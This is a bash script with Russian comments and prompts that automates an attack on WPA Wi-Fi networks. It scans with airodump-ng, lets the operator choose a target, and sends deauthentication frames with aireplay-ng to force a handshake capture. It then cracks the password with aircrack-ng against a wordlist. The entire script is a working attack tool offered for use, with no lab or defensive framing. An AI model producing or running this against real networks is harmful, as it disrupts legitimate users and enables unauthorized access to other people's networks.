#!/bin/bash
# Скрипт сканирования и выбора Wi-Fi сети

# Функция для сканирования Wi-Fi сетей
scan_networks() {
    rm file-01.cap file-01.csv file-01.kismet.csv file-01.kismet.netxml file-01.log.csv scan_results-01.csv
    echo "Сканирование Wi-Fi сетей..."
    airodump-ng wlan1 --output-format csv -w scan_results --write-interval 15 --showack &
    sleep 15
    pkill airodump-ng
    echo "Сети найдены:"
    cat scan_results-01.csv | grep "WPA" | awk -F, '{print NR") BSSID:", $1, "Канал:", $4, "ESSID:", $14}'
}

# Функция для выбора Wi-Fi сети
select_network() {
    read -p "Выберите номер сети для записи (из представленных выше): " network
    BSSID=$(cat scan_results-01.csv | grep "WPA" | awk -F, 'NR=='$network' {print $1}')
    CHANNEL=$(cat scan_results-01.csv | grep "WPA" | awk -F, 'NR=='$network' {print $4}')
    airodump-ng --bssid $BSSID -c $CHANNEL wlan1
    aireplay-ng --deauth 15 -a $BSSID wlan1
    airodump-ng --bssid $BSSID -c $CHANNEL -w file wlan1
    echo "КАП файл получен, проверь его, он называеться file-01.cap"
    echo -n "Взломать aircrack сейчас? y=да n=нет:"
    read NUM

    if [[ $NUM -eq y ]]
    then
    echo "Приступаю ко взлому через 3 секунды"
    sleep 3
    aircrack-ng -w /9mil.txt -b $BSSID file-01.cap
    else
    echo "КАП файл под названием file-01.cap сохранен, проверьте другие файлы для анализа в случае неообходимости"
    fi
}

# Вызов функций
scan_networks
select_network
